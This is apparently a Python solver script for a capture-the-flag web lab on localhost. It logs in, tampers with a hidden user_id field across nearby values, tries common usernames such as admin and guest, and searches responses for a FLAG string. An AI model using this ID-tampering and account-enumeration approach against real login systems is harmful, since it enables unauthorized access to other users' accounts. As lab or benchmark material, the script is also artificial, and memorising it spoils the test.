import requests
import re

BASE_URL = 'http://127.0.0.1:32929'

session = requests.Session()

# Step 1: username step with 'test'
username = 'test'
url_root = f"{BASE_URL}/"
resp1 = session.post(url_root, data={'username': username}, allow_redirects=False)
print(f"STEP1 username_login | username={username} | status={resp1.status_code}")
print(f"STEP1 headers: {dict(resp1.headers)}")

next_url = None
if resp1.is_redirect or resp1.status_code in (301, 302, 303, 307, 308):
    loc = resp1.headers.get('Location')
    if loc:
        if loc.startswith('http'):
            next_url = loc
        else:
            next_url = BASE_URL + loc
print(f"STEP1 redirect_to: {next_url}")

# Step 2: baseline password step
password_path = f"/password/{username}"
if next_url is None:
    next_url = f"{BASE_URL}{password_path}"

baseline_data = {
    'username': username,
    'user_id': '10032',
    'password': 'test'
}
resp2 = session.post(next_url, data=baseline_data, allow_redirects=True)
print(f"BASELINE login | final_status={resp2.status_code} | final_url={resp2.url} | body_len={len(resp2.text)}")
print("BASELINE body_first_500:")
print(resp2.text[:500])

flag_pattern = re.compile(r"FLAG\{[^}\n]*\}")

# Helper to summarize responses and search for flags

def analyze_response(label, param_value, resp):
    text = resp.text
    has_flag = 'FLAG{' in text
    summary = f"{label}\t{param_value}\t{resp.status_code}\t{len(text)}\t{has_flag}"
    print(summary)
    if has_flag:
        for line in text.splitlines():
            if 'FLAG{' in line:
                print(f"FLAG_LINE: {line}")

print("TYPE\tVALUE\tSTATUS\tLEN\tFLAG_FOUND")

# 5a) user_id fuzzing around 10032
base_id = 10032
for offset in range(-5, 6):
    test_id = base_id + offset
    data = {
        'username': 'test',
        'user_id': str(test_id),
        'password': 'test'
    }
    try:
        resp = session.post(f"{BASE_URL}{password_path}", data=data, allow_redirects=True)
        analyze_response('user_id', str(test_id), resp)
    except Exception as e:
        print(f"ERROR user_id {test_id}: {e}")

# 5b) username path segment fuzzing on login path
candidates = ['test', 'admin', 'john', 'mary', 'guest']
for cand in candidates:
    try:
        # username step
        r1 = session.post(url_root, data={'username': cand}, allow_redirects=False)
        # determine password URL
        pwd_url = None
        if r1.is_redirect or r1.status_code in (301, 302, 303, 307, 308):
            loc = r1.headers.get('Location')
            if loc:
                if loc.startswith('http'):
                    pwd_url = loc
                else:
                    pwd_url = BASE_URL + loc
        if pwd_url is None:
            pwd_url = f"{BASE_URL}/password/{cand}"
        data = {
            'username': cand,
            'user_id': '10032',
            'password': 'test'
        }
        r2 = session.post(pwd_url, data=data, allow_redirects=True)
        analyze_response('username', cand, r2)
    except Exception as e:
        print(f"ERROR username {cand}: {e}")

